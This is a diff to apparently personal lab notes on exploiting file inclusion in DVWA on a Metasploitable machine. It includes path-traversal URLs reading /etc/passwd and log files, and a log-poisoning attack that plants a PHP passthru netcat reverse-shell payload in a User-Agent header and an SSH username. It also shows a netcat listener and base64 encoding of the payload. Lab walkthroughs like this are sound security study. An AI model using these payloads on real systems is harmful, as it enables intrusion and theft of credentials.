@@ -57,6 +57,7 @@ nc -vv -l -p 8080
 ## File Inclusion Vulnerability
 - it allows you to read  any file in the same server.
 - access files outside www directory.
+- it is used to get the reverse connection of the webserver.
 - generally to get the commands to be executed in the kali linux we use  `cat etc/passwd`, the same we use in the file url to extract all the saved passwds.
 ```
 http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
@@ -67,7 +68,7 @@ http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
 - ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/faab1ae4-f1dc-4578-9098-b2995c78dc04)
 - by modifing the useragent to `<?passthru("nc -e /bin/sh 192.168.11.128 8888");?>` in the bruiteforce header for the connect of the website..and the terminal of kali linux `nc -vv -l -p 8888` to make connection.
 - ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/26b2674a-e047-4c5f-8f72-bc938ca5ed35)
-
+### Methods Of Exploitation
 - Now as reference from the above use the another executable urls.
  ```
 http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../..//proc/self/environ
@@ -78,7 +79,21 @@ http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth
 ```
 http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/apache2/access.log
 ```
-- ![Screenshot 2024-04-12 231128](https://github.com/stellados53/kali_commands/assets/142677726/9cc2d6f4-169b-41f9-b5d6-82513acb37b7)
-- from above image the first one  `proc/self/environ` we get..
-- ![Screenshot 2024-04-12 231736](https://github.com/stellados53/kali_commands/assets/142677726/ab250e34-700e-49c3-bcb9-500b88edd38c)
+- In `proc/self/environ`..it retrieves the information about the client information.
+> ![Screenshot 2024-04-12 231736](https://github.com/stellados53/kali_commands/assets/142677726/ab250e34-700e-49c3-bcb9-500b88edd38c)
+>
+- In `var/log/auth.log`..it retrieves all the login attempts to the webserver.
+- In the split the terminal into 2 the one contains the the connection command that is `nc -vv -l -p 8888` and the other will be `ssh "<?passthru('nc -e /bin/sh 192.168.11.128 8888');?>@192.168.11.128`
+- But the passthru command contain spaces that is between nc and -e etc..so we use decoder from the bruiteforce to encode the command as base64 to get a non-indent space line
+> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a13b5290-c212-4249-9e31-a40e1a2b3914)
+> 
+- now..run the command as per the image.
+> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/b7b7144e-e541-40ee-85f1-86ca80ac5fae)
+> 
+- then we get the final reverse connection to the webserver..
+> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/5ce2bbdf-bd7f-407f-9bbb-7945b1662342)
+
+
+
+
 
